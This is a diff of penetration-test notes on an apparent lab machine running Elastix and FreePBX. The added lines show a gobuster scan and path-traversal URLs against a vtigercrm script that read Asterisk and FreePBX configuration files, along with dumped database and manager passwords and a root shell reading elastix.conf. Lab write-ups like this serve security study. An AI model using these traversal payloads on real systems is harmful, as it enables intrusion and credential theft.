@@ -187,7 +187,7 @@ fanis/      spamfilter/
 aeff3def0c765c2677b94715cffa73ac
 ```
 
-* Other exploitation methods [TBC]
+* Other exploitation methods 
 * Gobuster with Web-Content wordlist
 ```
 gobuster dir -u https://10.10.10.7 -w /usr/share/seclists/Discovery/Web-Content/big.txt -k
@@ -266,4 +266,72 @@ haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
 xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
 fanis:x:501:501::/home/fanis:/bin/bash
 ```
-* root and user,fanis
+* Non-service user accounts: root and fanis
+* Asterisk config files
+```
+https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/asterisk.conf%00
+
+[directories]
+astetcdir => /etc/asterisk
+astmoddir => /usr/lib/asterisk/modules
+astvarlibdir => /var/lib/asterisk
+astagidir => /var/lib/asterisk/agi-bin
+astspooldir => /var/spool/asterisk
+astrundir => /var/run/asterisk
+astlogdir => /var/log/asterisk
+astdatadir => /var/lib/asterisk
+
+[options]
+transmit_silence_during_record = yes 
+languageprefix=yes
+execincludes=yes
+
+https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00
+
+# This file is part of FreePBX.
+#
+#    FreePBX is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 2 of the License, or
+#    (at your option) any later version.
+#
+#    FreePBX is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
+#
+# This file contains settings for components of the Asterisk Management Portal
+# Spaces are not allowed!
+# Run /usr/src/AMP/apply_conf.sh after making changes to this file
+
+# FreePBX Database configuration
+# AMPDBHOST: Hostname where the FreePBX database resides
+# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
+# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
+# AMPDBUSER: Username used to connect to the FreePBX database
+# AMPDBPASS: Password for AMPDBUSER (above)
+# AMPENGINE: Telephony backend engine (e.g. asterisk)
+# AMPMGRUSER: Username to access the Asterisk Manager Interface
+# AMPMGRPASS: Password for AMPMGRUSER
+#
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+# AMPDBNAME=asterisk
+AMPDBUSER=asteriskuser
+# AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPENGINE=asterisk
+AMPMGRUSER=admin
+#AMPMGRPASS=amp111
+AMPMGRPASS=jEhdIekWmdjE
+```
+* Elastix config file
+```
+[root@beep etc]# cat /etc/elastix.conf 
+mysqlrootpwd=jEhdIekWmdjE
+cyrususerpwd=jEhdIekWmdjE
+amiadminpwd=jEhdIekWmdjE
+```
